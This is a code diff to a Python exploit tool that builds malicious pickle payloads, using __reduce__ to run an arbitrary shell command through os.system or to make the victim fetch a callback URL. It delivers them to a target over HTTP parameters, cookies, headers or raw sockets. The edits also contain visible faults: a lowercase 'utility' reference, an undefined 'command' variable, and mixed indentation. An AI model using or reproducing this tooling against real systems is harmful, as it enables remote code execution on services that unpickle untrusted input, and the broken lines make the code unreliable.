@@ -2,11 +2,10 @@ import pickle
 import base64
 import requests
 import socket
-import argparse
 
 class Utility:
     command = ""
-
+    pingbackurl=""
     @staticmethod
     def b64pickle(payload):
         p = getattr(Payloads, payload)
@@ -27,15 +26,21 @@ class Payloads:
         def __reduce__(self):
             import os
             return (os.system, (Utility.command,))
+    class pingback:
+    	def __reduce__(self):
+            import requests
+            return (requests.get, (utility.pingbackurl,))
 
 def updatecmd(new_cmd):
     Utility.command = new_cmd
+def updatepingbackurl(new_pingbackurl):
+	Utility.pingbackurl = new_pingbackurl
 
 def webreq(method, url, payload, param=None, cook=None, custom_header=None):
     methods = ["get", "post", "put", "patch"]
     payload = Utility.urlpickle(payload)
     payload = payload.decode("utf-8")
-    headers = {custom_header:payload} or {}
+    headers = {custom_header:payload} if custom_header else {}
     if method in methods:
         request_method = getattr(requests, method)
     if param:
@@ -56,6 +61,8 @@ def webreq(method, url, payload, param=None, cook=None, custom_header=None):
     return f"Firing webreq attack against {url}"
 
 def socksend(rhost, rport, payload, enc, steps=0, use_ipv6=False):
+    if command:
+        updatecmd(command)
     rport = int(rport)
     steps = int(steps)
     payload = Utility.b64pickle(payload) if enc else Utility.plainpickle(payload)
@@ -68,7 +75,10 @@ def socksend(rhost, rport, payload, enc, steps=0, use_ipv6=False):
         s.sendall(payload)
         s.close()
 
+
 def socklisten(lport, payload, enc, steps=0, use_ipv6=False):
+    if command:
+        updatecmd(command)
     lport = int(lport)
     steps = int(steps)
     payload = Utility.b64pickle(payload) if enc else Utility.plainpickle(payload)
@@ -83,4 +93,3 @@ def socklisten(lport, payload, enc, steps=0, use_ipv6=False):
                 conn.recv(1024)
             conn.sendall(payload)
             conn.close()
-
